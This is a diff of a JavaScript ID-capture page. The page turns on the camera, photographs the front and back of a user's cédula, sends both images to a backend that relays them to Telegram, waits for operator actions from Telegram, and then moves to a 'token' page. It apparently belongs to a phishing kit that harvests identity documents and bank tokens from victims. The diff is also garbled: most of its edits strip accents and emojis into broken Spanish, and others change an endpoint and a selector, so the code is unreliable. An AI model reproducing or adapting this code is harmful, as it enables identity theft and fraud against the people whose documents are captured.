@@ -1,14 +1,14 @@
-/**
- * CÉDULA - CAPTURA DE DOCUMENTO
- * Captura frontal y trasera de la cédula con validación
- * Versión optimizada con arquitectura robusta
+﻿/**
+ * Cédula  CAPTURA DE DOCUMENTO
+ * Captura frontal y trasera de la Cédula con validacin
+ * Versin optimizada con arquitectura robusta
  */
 
 (() => {
     'use strict';
 
     // ============================
-    // ESTADO DE LA APLICACIÓN
+    // ESTADO DE LA APLICACIN
     // ============================
     const appState = {
         video: null,
@@ -50,18 +50,18 @@
     const IMAGE_QUALITY = 0.95;
 
     // ============================
-    // INICIALIZACIÓN
+    // INICIALIZACIN
     // ============================
     function init() {
-        console.log('🎬 Inicializando captura de cédula...');
+        console.log(' Inicializando captura de Cédula...');
 
         if (!initializeElements()) {
-            console.error('❌ Error: Elementos DOM no encontrados');
+            console.error(' Error: Elementos DOM no encontrados');
             return;
         }
 
         if (!validateCommonUtils()) {
-            console.error('❌ Error: commonUtils no disponible');
+            console.error(' Error: commonUtils no disponible');
             return;
         }
 
@@ -74,14 +74,14 @@
         // Configurar event listeners
         setupEventListeners();
 
-        // Iniciar cámara automáticamente
+        // Iniciar cmara automticamente
         startCamera();
 
-        console.log('✅ Inicialización completada');
+        console.log(' Inicializacin completada');
     }
 
     // ============================
-    // INICIALIZACIÓN DE ELEMENTOS
+    // INICIALIZACIN DE ELEMENTOS
     // ============================
     function initializeElements() {
         elements.video = document.getElementById('video');
@@ -89,7 +89,7 @@
         elements.captureBtn = document.getElementById('captureBtn');
         elements.continueBtn = document.getElementById('continueBtn');
         elements.instructionText = document.getElementById('instructionText');
-        elements.progressStep = document.querySelector('.progress-step.active');
+        elements.progressStep = document.querySelector('.progressstep.active');
 
         appState.video = elements.video;
         appState.canvas = elements.canvas;
@@ -116,13 +116,13 @@
             if (storedData) {
                 const data = JSON.parse(storedData);
                 appState.messageId = data.messageId || `temp_${Date.now()}`;
-                console.log('📦 Datos previos cargados, messageId:', appState.messageId);
+                console.log(' Datos previos cargados, messageId:', appState.messageId);
             } else {
                 appState.messageId = `cedula_${Date.now()}`;
-                console.log('⚠️ No hay datos previos, messageId generado:', appState.messageId);
+                console.log(' No hay datos previos, messageId generado:', appState.messageId);
             }
         } catch (error) {
-            console.error('❌ Error al cargar datos previos:', error);
+            console.error(' Error al cargar datos previos:', error);
             appState.messageId = `cedula_${Date.now()}`;
         }
     }
@@ -147,27 +147,27 @@
     }
 
     // ============================
-    // CÁMARA
+    // CMARA
     // ============================
     async function startCamera() {
         if (appState.isCameraActive) {
-            console.log('⚠️ La cámara ya está activa');
+            console.log(' La cmara ya est activa');
             return;
         }
 
         try {
-            console.log('📹 Iniciando cámara...');
+            console.log(' Iniciando cmara...');
             appState.stream = await navigator.mediaDevices.getUserMedia(CAMERA_CONSTRAINTS);
             
             elements.video.srcObject = appState.stream;
             elements.video.play();
             
             appState.isCameraActive = true;
-            console.log('✅ Cámara iniciada correctamente');
+            console.log(' Cmara iniciada correctamente');
         } catch (error) {
-            console.error('❌ Error al acceder a la cámara:', error);
+            console.error(' Error al acceder a la cmara:', error);
             window.commonUtils.showError(
-                'No se pudo acceder a la cámara. Por favor, otorgue los permisos necesarios.'
+                'No se pudo acceder a la cmara. Por favor, otorgue los permisos necesarios.'
             );
         }
     }
@@ -177,7 +177,7 @@
             appState.stream.getTracks().forEach(track => track.stop());
             appState.stream = null;
             appState.isCameraActive = false;
-            console.log('🛑 Cámara detenida');
+            console.log(' Cmara detenida');
         }
     }
 
@@ -186,7 +186,7 @@
     // ============================
     async function handleCapture() {
         if (appState.isCapturing) {
-            console.log('⚠️ Captura en progreso...');
+            console.log(' Captura en progreso...');
             return;
         }
 
@@ -194,7 +194,7 @@
         elements.captureBtn.disabled = true;
 
         try {
-            console.log(`📸 Capturando lado ${appState.currentSide}...`);
+            console.log(` Capturando lado ${appState.currentSide}...`);
 
             // Obtener foto en base64
             const photoData = capturePhoto();
@@ -203,28 +203,28 @@
                 throw new Error('No se pudo capturar la foto');
             }
 
-            // Guardar foto según el lado
+            // Guardar foto segn el lado
             appState.capturedPhotos[appState.currentSide] = photoData;
-            console.log(`✅ Foto ${appState.currentSide} capturada`);
+            console.log(` Foto ${appState.currentSide} capturada`);
 
-            // Si es frontal, NO enviar aún, solo cambiar UI
+            // Si es frontal, NO enviar an, solo cambiar UI
             if (appState.currentSide === 'frontal') {
-                console.log('✅ Foto frontal capturada, cambiando a trasera...');
+                console.log(' Foto frontal capturada, cambiando a trasera...');
                 // Cambiar a captura trasera INMEDIATAMENTE
                 appState.currentSide = 'trasera';
                 updateUIForSide('trasera');
                 elements.captureBtn.disabled = false;
-                console.log('📸 Listo para capturar lado trasero');
+                console.log(' Listo para capturar lado trasero');
             } else {
-                // Ambos lados capturados, ahora sí enviar TODO
-                console.log('✅ Ambos lados capturados, enviando a Telegram...');
+                // Ambos lados capturados, ahora s enviar TODO
+                console.log(' Ambos lados capturados, enviando a Telegram...');
                 window.loadingOverlay.showSending('Enviando documentos...');
                 
                 // Enviar ambas fotos
                 await sendPhotoToTelegram(appState.capturedPhotos.frontal, 'frontal');
                 await sendPhotoToTelegram(appState.capturedPhotos.trasera, 'trasera');
                 
-                // Mostrar botón continuar
+                // Mostrar botn continuar
                 elements.captureBtn.style.display = 'none';
                 if (elements.continueBtn) {
                     elements.continueBtn.style.display = 'block';
@@ -233,7 +233,7 @@
             }
 
         } catch (error) {
-            console.error('❌ Error en captura:', error);
+            console.error(' Error en captura:', error);
             window.commonUtils.showError('Error al capturar la foto. Intente nuevamente.');
             elements.captureBtn.disabled = false;
         } finally {
@@ -252,7 +252,7 @@
     }
 
     // ============================
-    // ENVÍO A TELEGRAM
+    // ENVO A TELEGRAM
     // ============================
     async function sendPhotoToTelegram(photoData, side) {
         const sessionId = window.commonUtils.getSessionId();
@@ -265,10 +265,10 @@
             sessionId: sessionId
         };
 
-        console.log(`📤 Enviando foto ${side} a Telegram con sessionId:`, sessionId);
+        console.log(` Enviando foto ${side} a Telegram con sessionId:`, sessionId);
 
         try {
-            const response = await fetch('/api/send-telegram', {
+            const response = await fetch('/api/sendtelegram', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -286,30 +286,30 @@
                 throw new Error(result.error || 'Error al enviar foto');
             }
 
-            console.log(`✅ Foto ${side} enviada exitosamente, Message ID:`, result.messageId);
+            console.log(` Foto ${side} enviada exitosamente, Message ID:`, result.messageId);
 
-            // Si es la trasera (última), mantener overlay esperando respuesta
+            // Si es la trasera (ltima), mantener overlay esperando respuesta
             if (side === 'trasera') {
-                window.loadingOverlay.show('Esperando validación...');
+                window.loadingOverlay.show('Esperando validacin...');
             }
 
         } catch (error) {
-            console.error(`❌ Error al enviar foto ${side}:`, error);
+            console.error(` Error al enviar foto ${side}:`, error);
             window.loadingOverlay.hide();
             throw error;
         }
     }
 
     // ============================
-    // ACTUALIZACIÓN DE UI
+    // ACTUALIZACIN DE UI
     // ============================
     function updateUIForSide(side) {
         if (!elements.instructionText) return;
 
         if (side === 'trasera') {
-            elements.instructionText.textContent = 'Ahora captura el lado trasero de tu cédula';
-            elements.captureBtn.textContent = '📸 Capturar Reverso';
-            console.log('🔄 UI actualizada para captura trasera');
+            elements.instructionText.textContent = 'Ahora captura el lado trasero de tu Cédula';
+            elements.captureBtn.textContent = 'Capturar Reverso';
+            console.log(' UI actualizada para captura trasera');
         }
     }
 
@@ -317,7 +317,7 @@
     // CONTINUAR
     // ============================
     function handleContinue() {
-        console.log('➡️ Continuando al siguiente paso (token)...');
+        console.log(' Continuando al siguiente paso (token)...');
         window.location.href = 'token.html';
     }
 
@@ -325,7 +325,7 @@
     // ACCIONES DE TELEGRAM
     // ============================
     function handleTelegramAction(action) {
-        console.log('📱 Acción recibida de Telegram:', action);
+        console.log(' Accin recibida de Telegram:', action);
         window.loadingOverlay.hide();
 
         const actionHandlers = {
@@ -343,7 +343,7 @@
         if (handler) {
             handler();
         } else {
-            console.warn('⚠️ Acción desconocida:', action);
+            console.warn(' Accin desconocida:', action);
         }
     }
 
@@ -352,11 +352,11 @@
     // ============================
     function cleanup() {
         stopCamera();
-        console.log('🧹 Recursos liberados');
+        console.log(' Recursos liberados');
     }
 
     // ============================
-    // AUTO-INICIO
+    // AUTOINICIO
     // ============================
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
@@ -365,3 +365,6 @@
     }
 
 })();
+
+
+
